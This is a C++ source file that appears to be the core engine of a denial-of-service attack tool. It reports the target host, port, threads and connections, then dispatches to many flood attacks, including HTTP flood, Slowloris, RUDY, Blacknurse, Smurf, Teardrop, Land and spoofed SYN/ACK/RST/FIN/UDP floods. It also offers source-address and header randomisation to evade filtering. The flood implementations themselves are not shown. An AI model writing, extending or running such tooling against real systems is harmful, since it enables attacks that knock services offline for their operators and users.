#include <unistd.h>
#include <array>
#include <memory>
#include <utility>
#include "../Headers/Engine.hpp"
#include "../Headers/Attack_Vectors.hpp"
#include "../Headers/Logging.hpp"

void Engine::run() {
    std::unique_ptr<Attack_Vector> flood;
    char message[512]{};
    snprintf(message, sizeof(message), "Attacking %s:%s with %d Threads, %d Connections",
            conf->website.c_str(), conf->port.c_str(), conf->THREADS, conf->CONNECTIONS);
    print_info(message);
    snprintf(message, sizeof(message), "Delay: %d microsecs", conf->delay);
    print_info(message);

    switch(conf->vector){
        case Config::HTTP:
            print_info("Attack Vector: HTTP");
            flood = std::make_unique<Http_Flood>(conf);
            break;
        case Config::NullTCP:
            print_info("Attack Vector: NullTCP");
            flood = std::make_unique<Null_Flood>(conf);
            break;
        case Config::NullUDP:
            print_info("Attack Vector: NullUDP");
            flood = std::make_unique<Null_Flood>(conf);
            break;
        case Config::UDPFlood:
            print_info("Attack Vector: UDPFlood");
            flood = std::make_unique<Http_Flood>(conf);
            break;
        case Config::TCPFlood:
            print_info("Attack Vector: TCPFlood");
            flood = std::make_unique<Http_Flood>(conf);
            break;
        case Config::Slowloris:
            print_info("Attack Vector: Slowloris");
            flood = std::make_unique<Slowloris>(conf);
            break;
        case Config::Rudy:
            print_info("Attack Vector: Rudy");
            flood = std::make_unique<Slowloris>(conf);
            break;
        case Config::ICMPFlood:
            print_info("Attack Vector: ICMP Flood");
            flood = std::make_unique<ICMP_Flood>(conf);
            break;
        case Config::Blacknurse:
            print_info("Attack Vector: Black Nurse");
            flood = std::make_unique<ICMP_Flood>(conf);
            break;
        case Config::SpoofedSyn:
            print_info("Attack Vector: Spoofed Syn Flood");
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedAck:
            print_info("Attack Vector: Spoofed Ack Flood");
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedRST:
            print_info("Attack Vector: Spoofed Rst Flood");
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedURG:
            print_info("Attack Vector: Spoofed Urg Flood");
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedPUSH:
            print_info("Attack Vector: Spoofed Push Flood");
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedFin:
            print_info("Attack Vector: Spoofed Fin Flood");
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::SpoofedUDP:
            print_info("Attack Vector: Spoofed UDP");
            flood = std::make_unique<Spoofed_UDP_Flood>(conf);
            break;
        case Config::Beast:
            print_info("Attack Vector: Beast");
            flood = std::make_unique<Beast>(conf);
            break;
        case Config::TearDrop:
            print_info("Attack Vector: Teardrop");
            flood = std::make_unique<Spoofed_UDP_Flood>(conf);
            break;
        case Config::Land:
            print_info("Attack Vector: Land");
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::Smurf:{
            print_info("Attack Vector: Smurf");
            flood = std::make_unique<ICMP_Flood>(conf);
            break;
        }
        default:break;
    }
    if(conf->UseSSL){
        print_info("SSL Enabled");
    }
    if(conf->RandomizeHeader){
        print_info("Header Randomization Enabled");
    }
    if(conf->RandomizeUserAgent){
        print_info("Useragent Randomization Enabled");
    }
    if(conf->RandomizeSource){
        print_info("Source Randomization Enabled");
    }
    if(conf->RandomizePort){
        print_info("Port Randomization Enabled");
    }
    fprintf(stdout, "%s", "--- press <Ctrl+C> to stop ---\n\n\n");
    flood->run();
}

Engine::Engine(std::shared_ptr<Config> conf) : conf{std::move(conf)}{

}
